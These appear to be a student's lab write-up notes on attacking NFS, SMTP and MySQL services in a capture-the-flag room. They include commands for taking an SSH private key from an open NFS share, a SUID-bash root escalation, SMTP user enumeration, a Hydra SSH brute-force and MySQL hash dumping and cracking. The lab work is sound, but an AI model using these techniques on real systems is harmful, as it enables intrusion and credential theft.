# Network Services 2

#### Network File System or NFS
- Another network file sharing protocol, much like SFTP and SMB
- Allows users to access files on remote systems as if they were local files
- Works by mounting all or a portion of a file system on a server
- Clients access these files based on the privileges assigned to each of them, much like a local system
- How it works
    1. Client requests to mount a directory from a remote host onto their own local directory. Mount service connects the mount daemon using Remote Procedure Call or RPC.
    2. Server checks if the user has permission to mount the request directory. If permitted, returns a file handle that uniquely identifies each file and directory on the server.
    3. RPC call is placed to NFS Daemon or NFSD on the server which takes parameters such as file handle, name of file, user ID, group ID.
- NFS allows for file transfer between Windows, non-Windows, UNIX, MacOS, whatever OS

#### Enumerating NFS
- Enumeration: "a process which establishes an active connection to the target hosts to discover potential attack vectors in the system, and the same can be used for further exploitation of the system" - Infosec Institute
- NFS Common
    - Important to have on any machine using NFS, client or server
    - Includes the following programs: `lockd`, `statd`, `showmount`, `nfsstat`, `gssd`, `idmapd`, and `mount.nfs`
        - The main two are `showmount` and `monut.nfs`
- Port Scanning
    - `nmap` :) use it!
    - But, if you forget to or don't know how, see Network Services 1
- Mounting NFS Shares
    - Client systems should have a local directory specifically made to receive exported directories from the host server
    - You can mount this system to connect to the NFS share using this syntax: `sudo mount -t nfs <IP>:<share> <dir> -nolock`
        - Options
        1. `-t` - type of device to mount, "nfs" in this case
        2. `<IP>` - IP address of nfs server
        3. `<share>` - name of remote share to mount
        4. `<dir>` - local directory to mount to
        5. `-nolock` - don't use NLM locking
- Enumeration Breakdown
    - First, I do a regular nmap scan to check all ports. I found 7 open ports and 1 filtered port. 3 of those 7 ports were standard: SSH, RPC, and NFS. (22, 111, 2049)
        - Now, I know that both NFS and SSH are open and potentially exploitable
    - Given that NFS is open, I can use `showmount -e <IP>` to see what shares are available to access
        - Thankfully, I have access to the mounted directory by some miracle and find that it is exporting `/home *`. Obviously, the guy who set this up was trolling.
    - Ok, I have an open NFS port and a mounted directory. The next step to NFS enumeration is actually stealing everything from that mounted directory
        - First, make a local mount directory: `mkdir /tmp/mount`
        - Run `mount -t nfs <IP>:home /tmp/mount -nolock`
    - Easy, now `ls` that directory and be utterly disappointed as there is nothing
        - Sike! You forgot the `-la` flag
        - Now, I have access to the `.ssh` folder, thereby granting me the `id_rsa` or the public key
        - Also, the directory is called "cappucino" and we know that this is a home directory, so we also have a username
    - Now, we have a username and a public RSA key to a remote file system. What can we do with these? Recall, SSH is open...
        - `ssh -i /tmp/mount/.ssh/id_rsa cappucino@<IP>`

#### Exploiting NFS
- Well, I have access, what more do you want? WE MUST ESCALATE THOSE PRIVILEGES!!!
- Remember this: If you have a low privilege shell and a machine that has NFS shares, you might be able to escalate privileges
- Root Squashing
    - By default, root squashing is allowed on NFS shares
    - It prevents anyone connecting to the NFS share from having root access to the NFS volume
        - Remote root users are assigned as the user "nfsnobody" upon connection which has the least local privileges
        - If I can turn this off, I can create SUID bit files to grant myself as a remote user root access to the host server
- Set User ID or SUID
    - SUID bits are basically files that can be run with the permissions of the file owner or group 
    - I want super-user permissions
- Access Elevation Pathway
    1. NFS Access
    2. Low Privilege Shell
    3. Upload Bash Executable to the NFS share directory
    4. Set SUID via NFS due to misconfigured Root Squash
    5. SSH into target system
    6. Execute SUID Bit Bash Executable
    7. Root Access
- Method Breakdown
    - Basically, in the remote file system, you can't change permissions to run things right? Instead, you write a bash shell executable locally that grants you elevated access, share that into the mounted directory using NFS, then SSH into the remote system and run it from there to gain a root shell.
    - We have
    1. SSH access for user cappuccino
    2. NFS mounted directory
    - We can use
    1. Root Squashing Deletion
    2. Mounting a Bash Shell Executable into Remote System
- Experience
    - Unfortunately, since I put my mount directory in /tmp/ I lost it upon reconnecting, but getting it back was no hassle.
    - Now, I steal the bash shell executable from the target machine using `scp -i <id_rsa path> cappuccino@<IP>:/bin/bash <path>/bash`
        - This gives me an executable bash that I can change the permissions of locally
    - Perform `sudo chown root bash` to change the owner of the bash to root
        - Copy this file into cappuccino's home `cp bash <mount path>`
    - Now, add the SUID bit permission to the bash executable using `sudo chmod +s <mount path>/bash`
        - Check this with `ls -la <mount path>/bash`
        - It should end with `-sr-x`
    - Finally, SSH back into the machine and run the bash with `./bash -p` where `-p` persists the permissions, running as root with SUID
        - This brings me to a new shell where I'm logged in as root
        - Go to /root which is basically root's home and cat the file inside to get the flag

#### Simple Mail Transfer Protocol or SMTP
- SMTP is the standard protocol for mail transfer
    - In order to support email services, it partners up with the POP/IMAP protocol, forming a protocol pair
- SMTP Servers have 3 basic functions:
1. Verifies who is sending emails through the server
2. Sends outgoing mail
3. If mail can't be delivered, it is returned to sender
- When setting up a new email address in a third-party email client, you must configure the SMTP server configuration in order to send outgoing emails
- Post Office Protocol or POP and Internet Message Access Protocol or IMAP
    - Both POP and IMAP are email protocols that handle the transfer of emails between client and mail server
    - POP is more simplistic as it only downloads the inbox from the mail server to the client
    - IMAP is more sophisticated as it synchronizes the current inbox with the mail server, checking for variances and updating client from server and server from client
- How it works
1. User connects to the SMTP server's domain using the email client or application which initiates the SMTP handshake. This connection works over port 25 and once it is validated, the SMTP session starts
2. The email client takes whatever the user wants to send plus the user's identification to the server
3. The SMTP server checks if the domain name of the recipient and the sender are the same
4. The SMTP server of the sender makes a connection to the recipient's SMTP server before relaying the email. If unreachable, it is put into an SMTP queue
5. The recipient's SMTP server verifies the incoming email by checking if the domain and username have been recognized. If it has, the server sends the email forward to the POP or IMAP server
6. The email shows up in the recipient's inbox
    - There are plenty of subprotocols that haven't been discussed in this simple breakdown
- The SMTP server software is readily available on Windows and many other variants are able to run on Linux

#### Enumerating SMTP
- Poorly configured or vulnerable mail servers can provide attackers an initial foothold into a network
- Before actually attacking, fingerprint the server to make a precise target, ideally we want the version of the SMTP
- Metasploit
    - Scans a range of IP addresses and determines the version of any mail servers it encounters
- Enumerating Users
    - SMTP service has two commands that help to enumerate users
    1. `VRFY` - confirms the names of valid users
    2. `EXPN` - reveals the actual address of user's aliases
    - Using these, we can reveal a list of valid users
    - We can use a telnet connection to send these commands or just use Metasploit which provides the `smtp_enum` module that does the connection stuff for us
        - Simply feed it a host or range of hosts to scan and a wordlist containing usernames to enumerate
    - This technique is great for SMTP configurations, but a lot of non-metasploit tools work even better for OS-level user accounts
        - In the future, it could be adapted to work against other vulnerable SMTP daemons
- Enumeration Breakdown
    - First, I do a classic Nmap scan of all ports and find that 22 and 25 are open, but I only care for 25 for now
    - Then, enter metasploit with `msfconsole`
        - I want to use two modules: `smtp_version` and `smtp_enum` for enumeration
        - So, I search their paths using `search smtp_enum` and `search smtp_version`
        - I find that they're in `auxiliary/scanner/smtp`
    - To use the modules, run `use auxiliary/scanner/smtp/smtp_version` or the entire path, but with smtp_enum
        - Now, check the options of each module to see what parameters they need to work
        - I see that RHOSTS is needed by `smtp_version` and `smtp_enum`, so I provide that with the IP from the attack box and I also notice `USER_FILE` is needed by `smtp_enum`, so I download a dictionary of usernames from seclists
        - To set the options, use `set RHOSTS <IP>` and `set USER_FILE /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt`
    - Finally, run the module and get three important things
        - When I run `smtp_version` I find that the system's mail name is `polosmtp.home` and the MTA that is running the server is `Postfix`
        - When I run `smtp_enum` I find that one user is detected: `administrator`

#### Exploiting SMTP
- In order to exploit SMTP, we need an account name and the type of SMTP server and OS being used
- Based on my port scan, I found that SSH is also open, so I can run Hydra to brute-force the password of `administrator`
- Method Breakkdown
    - We have
    1. Two open ports: 22/25
    2. A username: administrator
    3. MTA: Postfix
    4. Email System Name: `polosmtp.home`
    - We can use
    1. SSH
    2. Hydra - `hydra -t 16 -l <username> -P <dictionary path> -vV <IP> ssh`
        - `-t` - number of parallel connections per target
        - `-l <username>` - which user to hax
        - `P <dictionary path>` - which dictionary to use
        - `vV` - verbose
        - `<IP>` - IP of server to exploit
        - `ssh` - use SSH protocol
- Experience
    - This was easy as heck and basically all the work was done in enumeration
    - Simply run `hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV <IP> ssh`
    - After 30 seconds or so, I found that `administrator` responds to the password `alejandro`
    - SSH into the machine with those credentials and get the flag

#### My Structure Query Language or MySQL
- MySQL is basically a Relational Database Management System or an RDBMS based on SQL
    - Database - a persistent organized collection of structure data
    - RDBMS - a software used to create and manage databases on a relational model
    - SQL - a language that allows the client-server model of RDBMS to communicate
- MySQL is made up of server and utility programs that help in the administration of MySQL databases
    - The MySQL server has the following procedure
    1. Create a database for storing and manipulating data, defining the relationship of each table
    2. Clients make requests by making specific statements in SQL
    3. Server responds to the client with whatever information requested
- MySQL can run on Linux, Windows, and is often used in the Linux, Apache, MySQL, and PHP or LAMP stack as a back end database

#### Enumerating MySQL
- For this room, you're put into a scenario where you have already enumerated the credentials "root:password" while enumerating the subdomains of a web server 
    - After failing to SSH with the credentials, you try MySQL
- Metasploit
    - That's right, the legend has returned
- Enumeration Breakdown
    - First, run a classic Nmap as a sanity check
    - You find open ports 3306 and 22 (MySQL and SSH)
    - I log in to the MySQL server using the credentials earlier as another sanity check using `mysql -h <IP> -u root -p --skip-ssl`
        - Enter the password and it works. Good.
    - Boot up Metasploit again using `msfconsole`
        - First, find the desired module using search
        - Then, check the options out to see if I need to provide anything
        - Set the options for PASSWORD, RHOSTS, and USERNAME
    - Run the exploit and now I have the version of the MySQL server
    - Set the SQL option to "show databases" instead of "select version()" to show all databases
        - I find four databases
        1. information_schema
        2. mysql
        3. performance_schema
        4. sys

#### Exploiting MySQL
- In order to exploit MySQL I need MySQL server credentials, MySQL server version, number and name of databases
- Schema
    - Synonymous with "database", particularly in commands in SQL syntax (`CREATE DATABASE = CREATE SCHEMA`)
    - In other databases, this might not be true
- Hashes
    - Cryptographic algorithm that turns a variable length input into a fixed length ouptut
    - MySQL hashes can index data to a hash table where each hash has a unique ID that serves as a pointer to original data
        - Basically, creates an index smaller than the original data to allow for more efficient search and access
        - The data we're extracting are password hashes which are a way of storing passwords in a non-plaintext format
- Method Breakdown
    - We have
    1. Credentials to MySQL server
    2. Version of MySQL server
    3. Number of databases and their names
    - We can use
    1. Metasploit
    2. JohnTheRipper
- Experience
    - First, I need to use the `mysql_schemadump` module in metasploit
        - I use `search mysql_schemadump` then use that path
        - I change the options for `PASSWORD`, `RHOSTS`, and `USERNAME`
        - I find all the tables of the entire database and each of their columns
    - Next, I want a hash dump, so I `search mysql_hashdump`
        - I use this, change the options again for `PASSWORDS`, `RHOSTS`, and `USERNAME`
        - I run the exploit and find every single user plus their hash including a new non-standard user with a hash
        - I copy this hash into my local machine and use JohnTheRipper to crack it
    - JohnTheRipper cracks the hash in no time, giving me the password "doggie" for the user carl
        - SSH into the machine with the credentials and steal that flag

#### Summary
- Breaking into an NFS file server was pretty simple, it was elevating privileges that was new to me. Bash shell executables are new to me and I'm not sure how they work exactly. I also don't know why chmod used the parameter `+s`. I do understand how the overall process for elevation works.
- This room went super smoothly for me, albeit I had to troubleshoot a couple of misconfiguration errors on my version of Kali as I do have a VM
- I learned everything from NFS, Bash shells, root squashing, privilege escalation, mounting, SMTP, POP/IMAP, Metasploit as a whole including six different modules, Hydra, MySQL, and JohnTheRipper. Lots of great and very common protocols and tools that I have used myself prior to this.